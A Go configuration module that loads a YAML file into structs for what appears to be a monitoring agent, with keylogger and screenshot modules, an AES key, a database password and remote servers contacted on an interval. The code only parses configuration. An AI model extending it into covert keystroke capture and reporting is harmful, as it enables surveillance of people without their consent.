package config

import (
	"fmt"
	"gopkg.in/yaml.v3"
	"os"
	"sync"
)

type InstallationConfig struct {
	DBPath     string `yaml:"DBPath"`
	ConfigFile string `yaml:"ConfigFile"`
	DBPassword string `yaml:"DBPassword"`
	AESKey     string `yaml:"AESKey"`
}

type ServerConfig struct {
	Address string `yaml:"Address"`
	Port    int    `yaml:"Port"`
	Key     string `yaml:"Key"`
}

type CommunicationConfig struct {
	Interval string         `yaml:"Interval"`
	Servers  []ServerConfig `yaml:"Servers"`
}

type AppsConfig struct {
	Keylogger     map[string]any `yaml:"Keylogger,omitempty"`
	Screenshot    map[string]any `yaml:"Screenshot,omitempty"`
	SecurityGuard map[string]any `yaml:"SecurityGuard,omitempty"`
}

type Config struct {
	Installation  InstallationConfig  `yaml:"Installation"`
	Communication CommunicationConfig `yaml:"Communication"`
	Apps          AppsConfig          `yaml:"Apps"`
}

var (
	Instance *Config
	once     sync.Once
)

func LoadConfig(path string) (*Config, error) {
	var loadError error

	once.Do(func() {
		data, readError := os.ReadFile(path)
		if readError != nil {
			loadError = fmt.Errorf("failed to read config file: %w", readError)
			return
		}
		Instance = &Config{}
		if yamlError := yaml.Unmarshal(data, Instance); yamlError != nil {
			loadError = fmt.Errorf("failed to parse YAML: %w", yamlError)
			return
		}
	})

	return Instance, loadError
}

func GetConfig() *Config {
	if Instance == nil {
		fmt.Println("Config not initialized. Call LoadConfig first.")
	}
	return Instance
}
